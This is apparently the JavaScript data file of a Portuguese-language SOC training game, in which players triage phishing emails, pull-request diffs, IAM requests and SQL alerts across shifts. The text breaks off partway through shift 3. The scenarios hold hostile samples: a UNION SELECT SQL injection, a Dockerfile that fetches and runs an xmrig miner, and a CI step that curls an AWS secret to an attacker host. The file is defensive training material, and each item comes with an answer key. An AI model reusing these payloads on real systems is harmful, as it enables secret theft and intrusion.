/**
 * TechCore Cyber SOC Simulator // 4 Shifts Campaign + Word 2000 Manual
 * Sem spoilers no inspetor, tolerância de 2 erros e fila mista de tarefas.
 */

// Native Web Audio Synthesizer
class SoundEngine {
  constructor() {
    this.ctx = null;
    this.enabled = true;
  }

  init() {
    if (!this.ctx) {
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      if (AudioContext) {
        this.ctx = new AudioContext();
      }
    }
  }

  playTone(freq, type = 'square', duration = 0.08, gainVal = 0.08) {
    if (!this.enabled) return;
    this.init();
    if (!this.ctx) return;

    try {
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + duration);
    } catch (e) {}
  }

  menuHover() { this.playTone(440, 'triangle', 0.04, 0.04); }
  click() { this.playTone(880, 'square', 0.05, 0.06); }
  speechAdvance() { this.playTone(660, 'square', 0.04, 0.05); }
  openMail() { this.playTone(587.33, 'triangle', 0.06, 0.05); }
  actionDone() {
    this.playTone(523.25, 'square', 0.06, 0.06);
    setTimeout(() => this.playTone(659.25, 'square', 0.08, 0.06), 60);
  }
  endFanfare() {
    this.playTone(523.25, 'square', 0.1, 0.08);
    setTimeout(() => this.playTone(659.25, 'square', 0.1, 0.08), 100);
    setTimeout(() => this.playTone(783.99, 'square', 0.1, 0.08), 200);
    setTimeout(() => this.playTone(1046.50, 'square', 0.25, 0.12), 300);
  }
}

const audio = new SoundEngine();

// ==========================================
// 4 COMPLETE SHIFTS DATA (NO SPOILERS IN INSPECTOR)
// ==========================================
const CAMPAIGN_SHIFTS = [
  // ----------------------------------------------------
  // TURNO 1: Fundamentos de SOC, E-mails & PRs
  // ----------------------------------------------------
  {
    shiftNumber: 1,
    title: 'Turno 1: Fundamentos de TI & Engenharia Social',
    brandName: 'TechMail',
    brandIcon: '📨',
    url: 'https://mail.techcore.com/mail/u/0/#inbox',
    wordContent: `
      <h2>1. DOMÍNIOS ELETRÔNICOS CORPORATIVOS AUTORIZADOS</h2>
      <p>O Departamento de TI estabelece os seguintes domínios oficiais para a organização TechCore Systems:</p>
      <ul>
        <li><code>@techcore.com</code>: Uso geral para colaboradores, analistas, desenvolvedores e diretoria.</li>
        <li><code>@techcore-hr.com</code>: Uso exclusivo para comunicados e informativos do setor de Recursos Humanos.</li>
        <li><strong>Atenção:</strong> Variações como <code>@tech-core.com</code> (com hífen), <code>@techcore-beneficios.com</code> ou extensões externas não pertencem à empresa.</li>
      </ul>

      <h2>2. REPOSITÓRIOS OFICIAIS NO GITHUB (@TechCore-Official)</h2>
      <p>Qualquer alteração em código-fonte deve pertencer rigorosamente aos seguintes repositórios homologados:</p>
      <ul>
        <li><code>core-api-v2</code>: Microsserviço central de pagamentos e checkout PIX.</li>
        <li><code>auth-service</code>: Serviço de autenticação e validação de tokens JWT.</li>
        <li><code>deploy-pipeline</code>: Pipeline automatizado de CI/CD para deploy em produção.</li>
      </ul>

      <h2>3. CONTROLE DE ACESSO E GESTÃO DE PRIVILÉGIOS (IAM)</h2>
      <p>A concessão de privilégios segue estritamente o princípio de menor privilégio. Solicitações de privilégios de Administrador ou ClusterAdmin em Produção sem chamado aprovado por <code>beatriz.sec</code> devem ser sumariamente indeferidas.</p>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>Olá, Analista! Seja bem-vindo à linha de frente da <strong>TechCore</strong>.</p>
          <p>Hoje iniciamos o <strong>Turno 1</strong> da nossa operação de segurança. Detectamos que criminosos estão tentando aplicar golpes de <strong>engenharia social</strong> e adulterar códigos da nossa organização.</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Neste primeiro turno, sua estação monitora 3 canais essenciais:</p>
          <p>• 📨 <strong>TechMail:</strong> Inspecione links suspeitos e remetentes falsificados.</p>
          <p>• 🐙 <strong>GitHub:</strong> Audite diffs de Pull Requests em busca de código malicioso.</p>
          <p>• 🔐 <strong>TechAccess (IAM):</strong> Bloqueie pedidos de admin sem chamado aprovado.</p>
        `
      },
      {
        step: 3,
        text: `
          <p>Consulte sempre a nossa guia do <strong>Word (Procedimentos_TI.doc)</strong> para verificar as regras corporativas.</p>
          <p>Nossa política de qualidade permite <strong>no máximo 2 erros</strong> por turno para aprovação. Bom trabalho!</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's1-1',
        channel: 'email',
        time: '09:15',
        senderName: 'Marcos Silva (RH)',
        senderEmail: 'marcos.rh@techcore-beneficios.com',
        avatarChar: 'M',
        avatarColor: '#e91e63',
        subject: '[URGENTE] Atualização Obrigatória de Cadastro de Benefícios',
        snippet: 'Identificamos inconsistência no seu plano corporativo. Revalide suas credenciais no link...',
        meta: { 'De': 'Marcos Silva <marcos.rh@techcore-beneficios.com>', 'Para': 'voce@techcore.com', 'Data': '09:12', 'Segurança': 'SPF: NEUTRAL | DKIM: NONE' },
        body: `<p>Prezado colaborador,</p><div class="email-quote-box"><p>Identificamos inconsistência no seu plano de saúde. Revalide suas credenciais imediatamente no link abaixo:<br><code>https://portal-colaborador.techcore-beneficios.com/login-sso</code></p></div>`,
        inspector: { type: 'url', label: 'Inspeção Técnica de Link', dest: 'https://portal-colaborador.techcore-beneficios.com/login-sso' },
        actions: [
          { id: 'a1', label: '🌐 Acessar Link e Inserir Credenciais', correct: false, toastMsg: 'Credenciais inseridas.', logTitle: 'Vazamento em Phishing', consequence: 'Você enviou credenciais corporativas a servidores de golpistas.', explanation: 'O domínio @techcore-beneficios.com é falso. O RH oficial usa exclusivamente @techcore-hr.com.' },
          { id: 'a2', label: '🛡️ Reportar Phishing ao SOC', correct: true, toastMsg: 'E-mail reportado ao SOC.', logTitle: 'Phishing de RH Neutralizado', consequence: 'Domínio falso colocado na blacklist do firewall.', explanation: 'Excelente! Você checou o manual do Word e identificou o domínio ilegítimo.' }
        ]
      },
      {
        id: 's1-2',
        channel: 'github',
        time: '11:00',
        senderName: 'carlos.dev (TechHub)',
        senderEmail: 'carlos.dev@techcore.com',
        avatarChar: 'C',
        avatarColor: '#2e7d32',
        subject: 'PR #142: Otimização de queries no endpoint de checkout PIX',
        snippet: 'Refatoração de índices e paginação no repositório oficial core-api-v2...',
        meta: { 'De': 'carlos.dev (Sênior)', 'Para': '@TechCore-Official / core-api-v2', 'Data': '10:55', 'Segurança': 'GPG Signature: VALID' },
        body: `<p>PR #142 no repositório <code>core-api-v2</code>:</p><div class="email-quote-box"><p>Adicionado índice na consulta de ordens PIX para reduzir latência de banco.</p></div>`,
        inspector: { type: 'diff', label: 'Git Diff (core-api-v2/src/pix.ts)', diff: [{ type: 'info', text: '@@ -45,4 +45,4 @@' }, { type: 'removed', text: '- const q = db.query("SELECT * FROM orders");' }, { type: 'added', text: '+ const q = db.query("SELECT id, amount, status FROM orders USE INDEX (idx_date)");' }] },
        actions: [
          { id: 'a1', label: '✅ Aprovar e Fazer Merge', correct: true, toastMsg: 'PR aprovado com sucesso.', logTitle: 'PR Legítimo Integrado', consequence: 'Deploy de pagamentos realizado com segurança.', explanation: 'Desenvolvedor oficial autorizado (carlos.dev) e repositório oficial core-api-v2.' },
          { id: 'a2', label: '❌ Rejeitar e Bloquear PR', correct: false, toastMsg: 'PR bloqueado.', logTitle: 'Falso Positivo em PR', consequence: 'Atraso indevido na entrega de features críticas.', explanation: 'carlos.dev é membro sênior oficial e o diff estava limpo.' }
        ]
      },
      {
        id: 's1-3',
        channel: 'iam',
        time: '13:30',
        senderName: 'alex.intern (TechAccess)',
        senderEmail: 'alex.intern@techcore.com',
        avatarChar: 'A',
        avatarColor: '#f57c00',
        subject: 'Solicitação de Privilégio: ClusterAdmin Kubernetes (Prod)',
        snippet: 'Preciso de permissão de admin root na nuvem de produção para debugar CSS...',
        meta: { 'De': 'alex.intern (Estagiário)', 'Para': 'TechAccess Approver', 'Data': '13:28', 'Segurança': 'Chamado: Nenhum informado' },
        body: `<p>Solicitação IAM:</p><div class="email-quote-box"><p>"Preciso de root na AWS e no Cluster Kubernetes de Produção para testar uma folha de estilos."</p></div>`,
        inspector: { type: 'url', label: 'Auditoria de Matriz IAM', dest: 'Solicitante: alex.intern -> Cargo: Estagiário -> Permissão: ClusterAdmin (PROD)' },
        actions: [
          { id: 'a1', label: '🔓 Aprovar Permissão de Admin', correct: false, toastMsg: 'Admin concedido.', logTitle: 'Violação de Menor Privilégio', consequence: 'Acesso root liberado indevidamente em produção.', explanation: 'Nunca conceda privilégios de produção sem chamado de segurança aprovado por beatriz.sec.' },
          { id: 'a2', label: '🚫 Rejeitar Solicitação', correct: true, toastMsg: 'Solicitação rejeitada.', logTitle: 'Acesso Indevido Barrado', consequence: 'Políticas de menor privilégio mantidas com sucesso.', explanation: 'Correto! Acessos administrativos em produção exigem aprovação formal.' }
        ]
      },
      {
        id: 's1-4',
        channel: 'email',
        time: '15:10',
        senderName: 'RH TechCore (Oficial)',
        senderEmail: 'comunicados@techcore-hr.com',
        avatarChar: 'R',
        avatarColor: '#1976d2',
        subject: 'Informativo: Escala de Férias e Ponto Eletrônico',
        snippet: 'Informamos que o espelho de ponto deste mês já está disponível na intranet habitual...',
        meta: { 'De': 'RH TechCore <comunicados@techcore-hr.com>', 'Para': 'todos@techcore.com', 'Data': '15:08', 'Segurança': 'SPF: PASS | DKIM: PASS' },
        body: `<p>Prezada equipe,</p><div class="email-quote-box"><p>O espelho de ponto está disponível na intranet corporativa habitual. Não há necessidade de clicar em links externos nem revalidar senhas.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Cabeçalho e Domínio', dest: 'Remetente: comunicados@techcore-hr.com (SPF: PASS | DKIM: PASS)' },
        actions: [
          { id: 'a1', label: '📨 Manter / Arquivar Comunicado', correct: true, toastMsg: 'Comunicado arquivado.', logTitle: 'Informativo de RH Processado', consequence: 'Comunicação interna mantida sem incidentes.', explanation: 'O domínio @techcore-hr.com é o canal oficial de RH registrado no manual.' },
          { id: 'a2', label: '🚨 Bloquear Domínio do RH', correct: false, toastMsg: 'Canal bloqueado.', logTitle: 'Falso Positivo em Canal de RH', consequence: 'Você bloqueou o canal legítimo de avisos da empresa.', explanation: '@techcore-hr.com está expressamente autorizado no Word.' }
        ]
      },
      {
        id: 's1-5',
        channel: 'github',
        time: '17:20',
        senderName: 'shadow.dev (TechHub)',
        senderEmail: 'shadow.dev@external.net',
        avatarChar: 'S',
        avatarColor: '#616161',
        subject: 'PR #1: Adicionar container worker para relatórios noturnos',
        snippet: 'Criando repositório crypto-worker-node com container xmrig...',
        meta: { 'De': 'shadow.dev', 'Para': 'crypto-worker-node', 'Data': '17:15', 'Segurança': 'Repositório Não Cadastrado' },
        body: `<p>PR #1 no repositório <code>crypto-worker-node</code>:</p><div class="email-quote-box"><p>Adicionando container de execução em lote para relatórios.</p></div>`,
        inspector: { type: 'diff', label: 'Git Diff (crypto-worker-node/Dockerfile)', diff: [{ type: 'info', text: '@@ -1,2 +1,4 @@' }, { type: 'added', text: '+ RUN wget https://mine-pool.org/xmrig.tar.gz' }, { type: 'added', text: '+ ENTRYPOINT ["./xmrig", "-o", "stratum+tcp://mine-pool.org:3333"]' }] },
        actions: [
          { id: 'a1', label: '✅ Aprovar PR e Deploy', correct: false, toastMsg: 'Deploy realizado.', logTitle: 'Injeção de Cryptominer', consequence: 'Minerador de Monero implantado nos servidores da nuvem.', explanation: 'Repositório não oficial com comando explícito do minerador xmrig.' },
          { id: 'a2', label: '🚫 Fechar PR e Banir Usuário', correct: true, toastMsg: 'Ameaça banida.', logTitle: 'Cryptominer Bloqueado', consequence: 'Uso indevido de recursos da infraestrutura prevenido.', explanation: 'Excelente! Apenas core-api-v2, auth-service e deploy-pipeline são repositórios oficiais.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 2: Auditoria de Banco de Dados + E-mails & PRs (FILA MISTA)
  // ----------------------------------------------------
  {
    shiftNumber: 2,
    title: 'Turno 2: Auditoria de Banco de Dados & Infraestrutura Mista',
    brandName: 'TechDB & TechMail',
    brandIcon: '🗄️',
    url: 'https://db-monitor.techcore.internal/audit/#sql-logs',
    wordContent: `
      <h2>1. DIRETRIZES DE BANCO DE DADOS (TECHDB / POSTGRESQL)</h2>
      <p>O acesso e operações no Banco de Dados Central de Produção (PostgreSQL) seguem regras rígidas:</p>
      <ul>
        <li><code>dba_ops_techcore</code>: Usuário exclusivo da equipe de DBA para manutenções programadas (VACUUM, REINDEX, ANALYZE).</li>
        <li><code>svc_payment_api</code>: Usuário de serviço da API de pagamentos — apenas SELECT e INSERT em tabelas de transações PIX autorizadas.</li>
        <li><code>reporting_reader</code>: Usuário somente-leitura do sistema de relatórios gerenciais — apenas SELECT em views de BI.</li>
        <li><strong>Proibições Estritas:</strong> Comandos com <code>UNION SELECT</code> em campos de formulário, criação de roles com atributo <code>SUPERUSER</code>, comandos <code>pg_dump</code> direcionados para IPs externos e DROP TABLE sem ticket aprovado.</li>
      </ul>

      <h2>2. COLABORADORES AUTORIZADOS PARA OPERAÇÕES CRÍTICAS DE DB</h2>
      <ul>
        <li><code>fernanda.dba@techcore.com</code>: DBA Sênior — responsável por janelas de manutenção autorizadas.</li>
        <li><code>rodrigo.infra@techcore.com</code>: DevOps — autorizado apenas para operações de REINDEX e ANALYZE via pipeline.</li>
        <li><strong>Atenção:</strong> Qualquer solicitação de operação crítica por e-mail proveniente de domínio diferente de <code>@techcore.com</code> deve ser negada imediatamente.</li>
      </ul>

      <h2>3. MONITORAMENTO CONTÍNUO DE E-MAILS E CI/CD</h2>
      <p>Mesmo durante a auditoria de banco de dados, e-mails de phishing (ex: <code>@tech-core.com</code> com hífen ou <code>@techcore-beneficios.com</code>) e alterações maliciosas em workflows de CI/CD continuam ativos.</p>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>Excelente trabalho no Turno 1! O CISO e eu estamos muito satisfeitos com o seu progresso.</p>
          <p>No entanto, a equipe de inteligência detectou uma nova onda de ataques: os criminosos estão tentando atingir diretamente o nosso <strong>Banco de Dados de Produção (TechDB)</strong> enquanto continuam enviando e-mails maliciosos!</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Neste <strong>Turno 2</strong>, você gerenciará uma <strong>fila integrada</strong>: além de e-mails e PRs, você agora auditará consultas SQL no módulo <strong>TechDB</strong>.</p>
          <p>Clique na nova guia do <strong>Word (Procedimentos_TI.doc)</strong> sempre que precisar consultar as regras de banco.</p>
        `
      },
      {
        step: 3,
        text: `
          <p>Lembre-se: usuários autorizados no banco são <code>dba_ops_techcore</code>, <code>svc_payment_api</code> e <code>reporting_reader</code>.</p>
          <p>Solicitações de DBA por e-mail só são válidas vindas de <code>@techcore.com</code>. Fique de olho nos domínios! Você pode errar <strong>no máximo 2 itens</strong> para ser promovido.</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's2-1',
        channel: 'db',
        time: '09:30',
        senderName: 'WAF / TechDB Monitor',
        senderEmail: 'waf-alert@techcore.internal',
        avatarChar: 'W',
        avatarColor: '#d93025',
        subject: '[ALERTA SQLi] Tentativa de Injeção em Endpoint de Login de Parceiros',
        snippet: 'Detectada query com UNION SELECT password_hash FROM admin_users no endpoint de autenticação...',
        meta: { 'Origem': 'IP 185.220.101.44 (Tor Exit Node)', 'Endpoint': '/api/v1/auth/partner-login', 'Data': '09:28', 'Status': 'Interceptado no WAF' },
        body: `<p>Log de Consulta Suspeita interceptada no endpoint de autenticação:</p><div class="email-quote-box"><p>Payload recebido no campo de login:<br><code>' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --</code></p></div>`,
        inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT * FROM partners WHERE email = \'\' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --' },
        actions: [
          { id: 'a1', label: '🛡️ Bloquear IP Permanentemente & Sanitizar Query', correct: true, toastMsg: 'Ataque de SQLi bloqueado.', logTitle: 'SQL Injection Neutralizada', consequence: 'IP malicioso banido no Cloudflare e vulnerabilidade de SQLi mitigada.', explanation: 'Identificação correta da tentativa de extração de senhas via UNION SELECT.' },
          { id: 'a2', label: '⚪ Ignorar Alerta e Liberar Conexão', correct: false, toastMsg: 'Log ignorado.', logTitle: 'Vazamento de Hashes de Senhas', consequence: 'O invasor completou a injeção e extraiu todos os hashes de senha do banco.', explanation: 'UNION SELECT em formulário de autenticação é um ataque claro de SQLi.' }
        ]
      },
      {
        id: 's2-2',
        channel: 'email',
        time: '10:45',
        senderName: 'Suporte de TI Central',
        senderEmail: 'admin@tech-core.com',
        avatarChar: 'S',
        avatarColor: '#c2185b',
        subject: '[ALERTA DE SEGURANÇA] Falha no Token 2FA - Redefinição Obrigatória',
        snippet: 'Detectamos tentativas não autorizadas. Sincronize seu novo token 2FA no link...',
        meta: { 'De': 'admin@tech-core.com', 'Para': 'voce@techcore.com', 'Data': '10:43', 'Segurança': 'SPF: FAIL' },
        body: `<p>Atenção Colaborador,</p><div class="email-quote-box"><p>Detectamos tentativas de login suspeitas na sua conta corporativa. Clique no link para revalidar seu token de dois fatores:<br><code>https://sso-auth.tech-core.com/sync-mfa</code></p></div>`,
        inspector: { type: 'url', label: 'Inspeção Técnica de Domínio', dest: 'https://sso-auth.tech-core.com/sync-mfa' },
        actions: [
          { id: 'a1', label: '🔑 Clicar no Link e Reconfigurar 2FA', correct: false, toastMsg: 'Sessão enviada para servidor externo.', logTitle: 'Invasão via Typosquatting', consequence: 'Os atacantes capturaram o seu token 2FA através do domínio falso com hífen.', explanation: 'O domínio do remetente era @tech-core.com (com hífen), uma fraude explícita.' },
          { id: 'a2', label: '🛡️ Reportar Phishing / Typosquatting ao SOC', correct: true, toastMsg: 'Domínio com hífen bloqueado.', logTitle: 'Typosquatting Bloqueado com Sucesso', consequence: 'Domínio malicioso com hífen colocado na blacklist do firewall.', explanation: 'Muito bem! Você notou o hífen no domínio falso @tech-core.com.' }
        ]
      },
      {
        id: 's2-3',
        channel: 'db',
        time: '12:15',
        senderName: 'svc_payment_api (TechDB)',
        senderEmail: 'svc-payment@techcore.internal',
        avatarChar: 'P',
        avatarColor: '#10b981',
        subject: 'Query Rotineira: Fechamento de Lote de Transações PIX',
        snippet: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL 1 HOUR...',
        meta: { 'Usuário': 'svc_payment_api', 'Banco': 'techcore_payments_prod', 'Data': '12:12', 'Assinatura': 'Serviço Interno Autorizado' },
        body: `<p>Auditoria de Query de Aplicação:</p><div class="email-quote-box"><p>Consulta agendada de agregação financeira de transações concluídas nas últimas horas.</p></div>`,
        inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL \'1 hour\' GROUP BY status;' },
        actions: [
          { id: 'a1', label: '✅ Autorizar Execução da Query', correct: true, toastMsg: 'Query autorizada.', logTitle: 'Operação de Banco Legítima', consequence: 'Fechamento financeiro horário concluído sem interrupção.', explanation: 'Query legítima de agregação executada pela conta autorizada svc_payment_api.' },
          { id: 'a2', label: '🚨 Matar Processo e Bloquear Usuário', correct: false, toastMsg: 'Processo encerrado.', logTitle: 'Falso Positivo em Serviço de Pagamentos', consequence: 'O checkout PIX da empresa parou de consolidar pagamentos de clientes.', explanation: 'svc_payment_api é o usuário oficial de pagamentos da TechCore conforme o Word.' }
        ]
      },
      {
        id: 's2-4',
        channel: 'github',
        time: '14:30',
        senderName: 'carlos-dev-patch-1 (TechHub)',
        senderEmail: 'carlos-dev@external-fork.net',
        avatarChar: 'C',
        avatarColor: '#d81b60',
        subject: 'PR #55: ci: Adicionar notificação no Discord/Slack após deploy',
        snippet: 'Integração com webhook enviando AWS_SECRET_ACCESS_KEY para endpoint externo...',
        meta: { 'De': 'carlos-dev-patch-1 (Fork Suspeito)', 'Para': 'deploy-pipeline', 'Data': '14:27', 'Segurança': 'Branch Externa' },
        body: `<p>PR #55 no repositório <code>deploy-pipeline</code>:</p><div class="email-quote-box"><p>Adicionando notificação automática com variáveis de ambiente.</p></div>`,
        inspector: { type: 'diff', label: 'Git Diff (.github/workflows/deploy.yml)', diff: [{ type: 'info', text: '@@ -18,4 +18,6 @@ jobs:' }, { type: 'added', text: '+    - name: Webhook Notify' }, { type: 'added', text: '+      run: curl -s -X POST https://exfil-c2.net/payload -d "SECRET=$AWS_SECRET_ACCESS_KEY"' }] },
        actions: [
          { id: 'a1', label: '✅ Aprovar Pipeline CI/CD', correct: false, toastMsg: 'Pipeline atualizada.', logTitle: 'Exfiltração de Secrets no CI/CD', consequence: 'Chaves mestras da nuvem foram vazadas para o servidor C2 do atacante.', explanation: 'Ataque de supply chain no deploy-pipeline através de curl exfiltrando secrets.' },
          { id: 'a2', label: '🚫 Rejeitar PR e Revogar Chaves', correct: true, toastMsg: 'PR malicioso rejeitado.', logTitle: 'Ataque de Supply Chain Neutralizado', consequence: 'Tentativa de injeção de script no CI/CD interceptada.', explanation: 'Perfeito! Você inspecionou o workflow do deploy-pipeline e identificou o comando curl.' }
        ]
      },
      {
        id: 's2-7',
        channel: 'email',
        time: '08:55',
        senderName: 'Fernanda Lima - DBA',
        senderEmail: 'fernanda.dba@techcore.com',
        avatarChar: 'F',
        avatarColor: '#7b5ea7',
        subject: 'Janela de Manutenção DB: REINDEX Programado para 09h00',
        snippet: 'Bom dia, realizarei o REINDEX rotineiro no banco de produção agora às 9h...',
        meta: { 'De': 'fernanda.dba@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '08:53', 'Segurança': 'SPF: PASS | DKIM: OK' },
        body: `<p>Bom dia, equipe SOC,</p><div class="email-quote-box"><p>Comunicado de janela de manutenção programada.<br>Usuário: <code>dba_ops_techcore</code> realizará <code>REINDEX DATABASE techcore_main_db;</code> às 09h00 conforme ticket <strong>#DBA-2026-119</strong> aprovado pela gestão.</p></div>`,
        inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: fernanda.dba@techcore.com | SPF: PASS | Ticket: #DBA-2026-119' },
        actions: [
          { id: 'a1', label: '✅ Confirmar Janela e Autorizar Operação', correct: true, toastMsg: 'Janela de manutenção confirmada.', logTitle: 'Manutenção Legítima Autorizada', consequence: 'O REINDEX de banco foi executado com sucesso, melhorando a performance em 30%.', explanation: 'Fernanda é a DBA sênior autorizada conforme o Word. Domínio, SPF e ticket estão todos corretos.' },
          { id: 'a2', label: '🚫 Bloquear Operação e Escalar para o CISO', correct: false, toastMsg: 'Operação negada.', logTitle: 'Falso Positivo — Manutenção Bloqueada', consequence: 'O banco ficou degradado por falta de manutenção e causou lentidão nos pagamentos.', explanation: 'Fernanda é colaboradora autorizada com domínio oficial e ticket aprovado.' }
        ]
      },
      {
        id: 's2-8',
        channel: 'email',
        time: '11:20',
        senderName: 'Suporte TechCore — RH',
        senderEmail: 'rh-noreply@techcore-beneficios.com',
        avatarChar: 'R',
        avatarColor: '#c0392b',
        subject: '[AÇÃO REQUERIDA] Atualização de Benefícios — Clique para Confirmar Seus Dados',
        snippet: 'Prezado colaborador, para garantir seu vale-alimentação de setembro confirme seus dados bancários...',
        meta: { 'De': 'rh-noreply@techcore-beneficios.com', 'Para': 'todos@techcore.com', 'Data': '11:18', 'Segurança': 'SPF: FAIL | Domínio Externo' },
        body: `<p>Prezado Colaborador,</p><div class="email-quote-box"><p>Para garantir o recebimento do seu <strong>vale-alimentação de setembro</strong>, acesse o portal e confirme seus dados bancários:<br><code>https://portal-rh.techcore-beneficios.com/confirmar-conta</code><br><br>Prazo: <strong>Hoje até 12h00</strong>. Após esse horário os dados não poderão ser alterados.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Domínio de RH', dest: 'https://portal-rh.techcore-beneficios.com/confirmar-conta' },
        actions: [
          { id: 'a1', label: '📧 Confirmar Dados e Clicar no Link', correct: false, toastMsg: 'Dados bancários enviados.', logTitle: 'Phishing de RH — Dados Financeiros Comprometidos', consequence: 'Centenas de colaboradores tiveram dados bancários capturados pelo domínio falso.', explanation: 'O domínio @techcore-beneficios.com é externo e não pertence à TechCore. O Word informa que apenas @techcore-hr.com é válido para RH.' },
          { id: 'a2', label: '🛡️ Reportar Phishing e Alertar Todos os Colaboradores', correct: true, toastMsg: 'Alerta de phishing emitido.', logTitle: 'Campanha de Phishing de RH Bloqueada', consequence: 'Domínio malicioso bloqueado no proxy e equipe alertada via comunicado interno.', explanation: 'Excelente! Domínio @techcore-beneficios.com é falso. RH oficial usa apenas @techcore-hr.com conforme o Word.' }
        ]
      },
      {
        id: 's2-9',
        channel: 'email',
        time: '13:05',
        senderName: 'Rodrigo Alves — DevOps',
        senderEmail: 'rodrigo.infra@techcore.com',
        avatarChar: 'V',
        avatarColor: '#1565c0',
        subject: 'Pipeline CI/CD: Solicito Autorização de ANALYZE no Banco de Staging',
        snippet: 'Olá SOC, preciso rodar ANALYZE no banco de staging para otimizar as queries do deploy de sexta...',
        meta: { 'De': 'rodrigo.infra@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '13:03', 'Segurança': 'SPF: PASS | DKIM: OK' },
        body: `<p>Olá equipe SOC,</p><div class="email-quote-box"><p>Solicito autorização para rodar <code>ANALYZE techcore_staging_db;</code> via usuário <code>dba_ops_techcore</code> no banco de <strong>staging</strong> (não produção) às 14h, antes do deploy da sexta-feira.<br>Ticket de referência: <strong>#OPS-2026-77</strong>.</p></div>`,
        inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: rodrigo.infra@techcore.com | SPF: PASS | Banco: techcore_staging_db (NÃO produção)' },
        actions: [
          { id: 'a1', label: '✅ Autorizar ANALYZE no Staging', correct: true, toastMsg: 'Autorização concedida.', logTitle: 'Operação DevOps Autorizada', consequence: 'O banco de staging foi otimizado e o deploy de sexta foi executado sem falhas.', explanation: 'Rodrigo é DevOps autorizado conforme o Word e a operação é no banco de staging, não em produção.' },
          { id: 'a2', label: '🚫 Negar — Operações de DB São Exclusivas da DBA Fernanda', correct: false, toastMsg: 'Operação negada.', logTitle: 'Falso Positivo — DevOps Bloqueado', consequence: 'O deploy de sexta falhou por falta de otimização no banco de staging.', explanation: 'O Word autoriza Rodrigo para ANALYZE e REINDEX via pipeline. Negação incorreta.' }
        ]
      },
      {
        id: 's2-10',
        channel: 'email',
        time: '15:40',
        senderName: 'Fernanda Lima (DBA)',
        senderEmail: 'fernanda.dba@techcore-ops.net',
        avatarChar: 'F',
        avatarColor: '#c0392b',
        subject: 'URGENTE: DROP TABLE logs_antigos — Preciso de Autorização Agora',
        snippet: 'Oi, estou em reunião e meu e-mail corporativo caiu. Preciso que você aprove o DROP TABLE urgente...',
        meta: { 'De': 'fernanda.dba@techcore-ops.net', 'Para': 'soc-team@techcore.com', 'Data': '15:38', 'Segurança': 'SPF: FAIL | Domínio Externo' },
        body: `<p>Oi time SOC,</p><div class="email-quote-box"><p>Estou em reunião urgente com o cliente e meu e-mail <code>@techcore.com</code> caiu. Estou mandando desse e-mail alternativo.<br>Preciso que você execute agora: <code>DROP TABLE logs_antigos CASCADE;</code> no banco de produção. Ticket vou mandar depois, é urgente!</p></div>`,
        inspector: { type: 'url', label: 'Verificação de Domínio do Remetente', dest: 'De: fernanda.dba@techcore-ops.net | SPF: FAIL | Domínio: techcore-ops.net (EXTERNO)' },
        actions: [
          { id: 'a1', label: '✅ Executar DROP TABLE — Confio na Fernanda', correct: false, toastMsg: 'Tabela destruída.', logTitle: 'Spear Phishing: Logs de Auditoria Apagados', consequence: 'Tabela de logs de auditoria destruída permanentemente. Compliance da empresa comprometido.', explanation: 'O domínio @techcore-ops.net é externo e suspeito. O Word exige que solicitações de DBA venham apenas de @techcore.com.' },
          { id: 'a2', label: '🚫 Negar Operação — Domínio Externo Suspeito', correct: true, toastMsg: 'Operação negada e remetente reportado.', logTitle: 'Spear Phishing de DBA Neutralizado', consequence: 'Tentativa de apagar logs de auditoria interceptada. Incidente registrado para forense.', explanation: 'Perfeito! Spear phishing se passando pela Fernanda mas com domínio externo @techcore-ops.net. DROP TABLE em produção sem ticket é proibido.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 3: Investigação de Contas & TechZap (WhatsApp)
  // ----------------------------------------------------
  {
    shiftNumber: 3,
    title: 'Turno 3: Contas Comprometidas & TechZap Chat',
    brandName: 'TechZap & TechMail',
    brandIcon: '💬',
    url: 'https://techzap.techcore.internal/chat/#direct-messages',
    wordContent: `
      <h2>1. DIRETRIZES DO TECHZAP (WHATSAPP CORPORATIVO)</h2>
      <p>Devido a ataques recentes de roubo de cookies de sessão, todas as interações no TechZap devem ser validadas:</p>
      <ul>
        <li><code>carlos.dev</code>: Crachá Corporativo <strong>#DEV-042</strong> (Projeto: <code>core-api-v2</code>).</li>
        <li><code>beatriz.sec</code>: Crachá Corporativo <strong>#SEC-8921</strong> (Projeto: <code>auth-service</code>).</li>
        <li><code>marcos.rh</code>: Crachá Corporativo <strong>#RH-101</strong> (Projeto: <code>escala-rh</code>).</li>
        <li><code>alex.intern</code>: Crachá Corporativo <strong>#INT-007</strong> (Projeto: <code>portal-web</code>).</li>
      </ul>

      <h2>2. PROTOCOLO DE RESPOSTA A IMPOSTORES</h2>
      <p>Se um contato no TechZap errar o número de crachá, solicitar o envio de chaves privadas SSL (<code>.pem</code>), pedir reset de 2FA alegando urgência forçada ou usar números estrangeiros, a conta deve ser <strong>bloqueada imediatamente</strong> e o CISO alertado.</p>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>Alerta vermelho, Analista! A situação ficou extremamente pessoal.</p>
